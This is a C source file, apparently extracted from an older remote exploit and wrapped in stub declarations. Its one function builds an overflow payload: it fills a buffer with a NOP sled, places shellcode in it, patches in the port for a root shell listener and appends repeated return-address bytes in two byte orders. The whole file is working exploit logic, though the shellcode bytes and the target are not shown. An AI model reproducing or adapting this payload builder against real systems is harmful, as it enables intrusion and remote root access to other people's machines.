#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int BUF_SIZE ; 
 int RET_ADDR ; 
 int htons (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memcpy (scalar_t__,int /*<<< orphan*/ ,scalar_t__) ; 
 int /*<<< orphan*/  memset (scalar_t__,int,int) ; 
 int /*<<< orphan*/  root_shell_port ; 
 scalar_t__ sc ; 
 int /*<<< orphan*/  shellcode ; 
 scalar_t__ strlen (int /*<<< orphan*/ ) ; 
 char* strstr (scalar_t__,char*) ; 

void make_shellcode(int order) {
	char *ptr;
	int i;

	// Finish making shellcode buffer
	memset(sc, 0x90,BUF_SIZE);
	memcpy(sc + BUF_SIZE - (strlen(shellcode)+1), shellcode, strlen(shellcode));

	// Fill in the port number
	ptr=strstr(sc, "XX");
	*(ptr++)=htons(root_shell_port)&0xff;
	*ptr=(htons(root_shell_port)>>8)&0xff;

	ptr=(char *)sc+BUF_SIZE;
	for(i=0;i<BUF_SIZE-4;i+=4) {
		switch(order) {
			case 0:
				*(ptr++)=RET_ADDR&0xff;
			        *(ptr++)=(RET_ADDR>>8)&0xff;
			        *(ptr++)=(RET_ADDR>>16)&0xff;
			        *(ptr++)=(RET_ADDR>>24)&0xff;	
				break;
			case 1:
				*(ptr++)=(RET_ADDR>>16)&0xff;
			        *(ptr++)=(RET_ADDR>>24)&0xff;	
				*(ptr++)=RET_ADDR&0xff;
			        *(ptr++)=(RET_ADDR>>8)&0xff;
				break;
		}
	}
	*ptr='\0';
}